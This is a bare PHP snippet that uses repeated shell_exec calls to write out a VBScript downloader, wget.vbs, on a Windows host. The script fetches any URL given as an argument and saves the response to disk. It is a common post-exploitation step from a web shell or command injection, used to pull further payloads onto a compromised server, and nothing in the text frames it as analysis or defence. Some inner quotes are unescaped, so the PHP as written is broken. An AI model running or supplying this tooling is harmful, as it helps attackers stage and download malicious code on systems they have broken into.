echo shell_exec("echo strUrl = WScript.Arguments.Item(0) > wget.vbs");
echo shell_exec("echo StrFile = WScript.Arguments.Item(1) >> wget.vbs");
echo shell_exec("echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs");
echo shell_exec("echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs");
echo shell_exec("echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs");
echo shell_exec("echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs");
echo shell_exec("echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs");
echo shell_exec("echo Err.Clear >> wget.vbs");
echo shell_exec("echo Set http = Nothing >> wget.vbs");
echo shell_exec("echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs");
echo shell_exec("echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs");
echo shell_exec("echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs");
echo shell_exec("echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs");
echo shell_exec("echo http.Open "GET",strURL,False >> wget.vbs");
echo shell_exec("echo http.Send >> wget.vbs");
echo shell_exec("echo varByteArray = http.ResponseBody >> wget.vbs");
echo shell_exec("echo Set http = Nothing >> wget.vbs");
echo shell_exec("echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs");
echo shell_exec("echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs");
echo shell_exec("echo strData = "" >> wget.vbs");
echo shell_exec("echo strBuffer = "" >> wget.vbs");
echo shell_exec("echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs");
echo shell_exec("echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs");
echo shell_exec("echo Next >> wget.vbs");
echo shell_exec("echo ts.Close >> wget.vbs");